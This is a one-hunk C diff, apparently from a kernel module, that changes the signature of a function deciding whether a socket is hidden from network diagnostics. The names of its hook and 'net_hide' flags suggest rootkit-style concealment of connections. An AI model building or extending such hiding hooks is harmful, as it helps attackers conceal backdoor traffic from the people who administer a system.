@@ -9,7 +9,7 @@
 
 extern unsigned int g_tcp_seq_hidden;
 
-bool lp_netdiag_relay_hidden(const struct sock *sk)
+bool lp_netdiag_relay_hidden(struct sock *sk)
 {
     if (!sk || !g_hooks_enabled || !g_profile.net_hide_enabled)
         return false;
